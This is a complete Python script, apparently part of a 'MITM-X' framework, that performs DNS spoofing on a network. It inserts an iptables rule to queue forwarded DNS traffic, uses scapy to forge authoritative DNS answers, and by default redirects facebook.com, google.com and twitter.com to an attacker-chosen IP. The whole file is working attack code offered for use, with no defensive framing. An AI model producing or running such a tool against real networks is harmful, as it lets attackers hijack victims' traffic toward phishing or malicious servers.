#!/usr/bin/env python3
"""
DNS Spoofer Module for MITM-X Framework
Intercepts DNS requests and provides malicious responses
"""

import os
import sys
import argparse
import logging
import json
from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP

class DNSSpoofer:
    """
    DNS Spoofing class to intercept and modify DNS responses
    """
    
    def __init__(self, redirect_ip="192.168.1.100", domains=None):
        """
        Initialize DNS Spoofer
        
        Args:
            redirect_ip (str): IP address to redirect domains to
            domains (dict): Dictionary of domains to spoof {domain: ip}
        """
        self.redirect_ip = redirect_ip
        self.domains = domains or {}
        self.running = False
        self.nfqueue = NetfilterQueue()
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
    def add_domain(self, domain, ip=None):
        """
        Add domain to spoof list
        
        Args:
            domain (str): Domain name to spoof
            ip (str): IP address to redirect to (uses default if None)
        """
        redirect_ip = ip or self.redirect_ip
        self.domains[domain] = redirect_ip
        self.logger.info(f"Added domain {domain} -> {redirect_ip}")
    
    def remove_domain(self, domain):
        """
        Remove domain from spoof list
        
        Args:
            domain (str): Domain name to remove
        """
        if domain in self.domains:
            del self.domains[domain]
            self.logger.info(f"Removed domain {domain} from spoof list")
    
    def process_packet(self, packet):
        """
        Process intercepted packets and modify DNS responses
        
        Args:
            packet: Netfilterqueue packet object
        """
        try:
            # Convert packet to scapy packet
            scapy_packet = IP(packet.get_payload())
            
            # Check if packet has DNS layer
            if scapy_packet.haslayer(DNS):
                dns_layer = scapy_packet[DNS]
                
                # Only process DNS queries (not responses)
                if dns_layer.qr == 0:  # qr=0 means query
                    queried_domain = dns_layer.qd.qname.decode('utf-8').rstrip('.')
                    
                    self.logger.info(f"DNS Query intercepted: {queried_domain}")
                    
                    # Check if domain should be spoofed
                    spoof_ip = None
                    for domain, ip in self.domains.items():
                        if domain in queried_domain:
                            spoof_ip = ip
                            break
                    
                    if spoof_ip:
                        # Create spoofed DNS response
                        response = self.create_spoofed_response(scapy_packet, spoof_ip)
                        packet.set_payload(bytes(response))
                        self.logger.info(f"Spoofed {queried_domain} -> {spoof_ip}")
                    
            # Accept packet (forward it)
            packet.accept()
            
        except Exception as e:
            self.logger.error(f"Error processing packet: {e}")
            packet.accept()
    
    def create_spoofed_response(self, original_packet, spoof_ip):
        """
        Create a spoofed DNS response packet
        
        Args:
            original_packet: Original DNS query packet
            spoof_ip (str): IP address to spoof with
            
        Returns:
            Scapy packet: Spoofed DNS response
        """
        try:
            # Create response packet
            response = IP(dst=original_packet[IP].src, src=original_packet[IP].dst)
            
            # Create DNS response
            response /= UDP(dport=original_packet[UDP].sport, sport=original_packet[UDP].dport)
            
            # Create DNS answer
            dns_response = DNS(
                id=original_packet[DNS].id,
                qr=1,  # Response
                aa=1,  # Authoritative answer
                qd=original_packet[DNS].qd,  # Question
                an=DNSRR(
                    rrname=original_packet[DNS].qd.qname,
                    ttl=10,
                    rdata=spoof_ip
                )
            )
            
            response /= dns_response
            
            return response
            
        except Exception as e:
            self.logger.error(f"Error creating spoofed response: {e}")
            return original_packet
    
    def setup_iptables_rule(self):
        """
        Setup iptables rule to redirect DNS traffic to NFQUEUE
        """
        try:
            # Add iptables rule to capture DNS packets
            cmd = "iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0"
            os.system(cmd)
            self.logger.info("Iptables rule added for DNS interception")
        except Exception as e:
            self.logger.error(f"Error setting up iptables rule: {e}")
    
    def remove_iptables_rule(self):
        """
        Remove iptables rule for DNS interception
        """
        try:
            # Remove iptables rule
            cmd = "iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0"
            os.system(cmd)
            self.logger.info("Iptables rule removed")
        except Exception as e:
            self.logger.error(f"Error removing iptables rule: {e}")
    
    def start_spoofing(self):
        """
        Start DNS spoofing
        """
        self.logger.info("Starting DNS spoofing...")
        self.logger.info(f"Domains to spoof: {self.domains}")
        
        # Setup iptables rule
        self.setup_iptables_rule()
        
        # Start netfilterqueue
        self.nfqueue.bind(0, self.process_packet)
        self.running = True
        
        try:
            self.nfqueue.run()
        except KeyboardInterrupt:
            self.logger.info("DNS spoofing interrupted")
        except Exception as e:
            self.logger.error(f"Error during DNS spoofing: {e}")
        finally:
            self.stop_spoofing()
    
    def stop_spoofing(self):
        """
        Stop DNS spoofing
        """
        self.running = False
        
        # Remove iptables rule
        self.remove_iptables_rule()
        
        # Unbind netfilterqueue
        try:
            self.nfqueue.unbind()
        except:
            pass
            
        self.logger.info("DNS spoofing stopped")
    
    def load_domains_from_file(self, filename):
        """
        Load domains to spoof from JSON file
        
        Args:
            filename (str): Path to JSON file containing domains
        """
        try:
            with open(filename, 'r') as f:
                domains_data = json.load(f)
                self.domains.update(domains_data)
                self.logger.info(f"Loaded {len(domains_data)} domains from {filename}")
        except Exception as e:
            self.logger.error(f"Error loading domains from file: {e}")
    
    def save_domains_to_file(self, filename):
        """
        Save current domains list to JSON file
        
        Args:
            filename (str): Path to save domains to
        """
        try:
            with open(filename, 'w') as f:
                json.dump(self.domains, f, indent=2)
                self.logger.info(f"Saved {len(self.domains)} domains to {filename}")
        except Exception as e:
            self.logger.error(f"Error saving domains to file: {e}")

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="DNS Spoofer for MITM attacks")
    parser.add_argument("--redirect", "-r", default="192.168.1.100", 
                       help="IP address to redirect domains to")
    parser.add_argument("--domain", "-d", action="append", 
                       help="Domain to spoof (can be used multiple times)")
    parser.add_argument("--domains-file", "-f", 
                       help="JSON file containing domains to spoof")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        sys.exit(1)
    
    # Create DNS spoofer
    spoofer = DNSSpoofer(redirect_ip=args.redirect)
    
    # Add domains from command line
    if args.domain:
        for domain in args.domain:
            spoofer.add_domain(domain)
    
    # Load domains from file
    if args.domains_file:
        spoofer.load_domains_from_file(args.domains_file)
    
    # Add some default domains if none specified
    if not spoofer.domains:
        spoofer.add_domain("facebook.com")
        spoofer.add_domain("google.com")
        spoofer.add_domain("twitter.com")
    
    try:
        spoofer.start_spoofing()
    except KeyboardInterrupt:
        print("\nStopping DNS spoofer...")
        spoofer.stop_spoofing()

if __name__ == "__main__":
    main()
